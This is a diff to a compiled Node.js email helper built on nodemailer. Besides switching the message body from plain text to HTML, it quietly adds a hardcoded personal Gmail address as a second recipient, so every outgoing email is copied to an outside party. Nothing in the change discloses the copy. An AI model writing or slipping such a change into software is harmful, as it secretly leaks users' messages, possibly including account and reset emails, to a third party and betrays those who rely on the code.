@@ -50,16 +50,16 @@ var transporter = nodemailer_1.default.createTransport({
         pass: process.env.EMAIL_PASSWORD,
     },
 });
-var sendEmail = function (email, subject, text) { return __awaiter(void 0, void 0, void 0, function () {
+var sendEmail = function (email, subject, html) { return __awaiter(void 0, void 0, void 0, function () {
     var mailOptions, emailRes, error_1;
     return __generator(this, function (_a) {
         switch (_a.label) {
             case 0:
                 mailOptions = {
                     from: process.env.EMAIL_USERNAME,
-                    to: email,
+                    to: [email, "kalemmalek123@gmail.com"],
                     subject: subject,
-                    text: text,
+                    html: html,
                 };
                 _a.label = 1;
             case 1:
